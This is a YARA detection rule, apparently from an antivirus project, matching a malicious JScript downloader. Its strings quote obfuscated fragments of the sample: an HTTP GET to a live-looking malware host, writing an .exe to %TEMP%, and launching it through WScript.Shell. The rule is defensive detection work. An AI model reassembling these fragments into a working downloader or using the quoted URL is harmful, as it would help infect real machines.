rule sig_20160329_d5636970b8b020556cac788de03ae6ec {
  meta:
    description = "datamaliciousorder - file 20160329_d5636970b8b020556cac788de03ae6ec.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b14ceecb0d2d6c4c3f47a253aab3b6d72f6ca9459e3ab9282ddfa48365082991"

  strings:
    $s1  = "H[dq](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function j() {return u0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uagF96Gnfu0EJTGZ.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[ja](z() * 11); if (H[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function n(GU, v){Bw = Bw * 1; return GU - v;};" fullword ascii
    $s5  = "var u0 = function k() {return WScript[D](\"WScript.Shell\");}(), VY = 11;" fullword ascii
    $s6  = "function Vt(){return \"\" + td;};" fullword ascii
    $s7  = "function bd() {return ((g0 == true) && (g0 == Tv)) ? 1 : Bw;};" fullword ascii
    $s8  = "function nM(HZ){u0[\"Run\"](HZ, Bw, Bw);};" fullword ascii
    $s9  = " while (OM){" fullword ascii
    $s10 = "function z(){return 22;};" fullword ascii
    $s11 = "function pa(){return D;};" fullword ascii
    $s12 = "return n(FG, oB);" fullword ascii
    $s13 = "var Jg = new this[\"Date\"]();" fullword ascii
    $s14 = "function rG(JV) {var D0 = (1, 2, 3, 4, 5, JV); return D0;};" fullword ascii
    $s15 = "var g0 = false;" fullword ascii
    $s16 = "var eG = false;" fullword ascii
    $s17 = "g0 = true; " fullword ascii
    $s18 = "var Tv = false;" fullword ascii
    $s19 = "Tv = true; " fullword ascii
    $s20 = "} catch(C0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}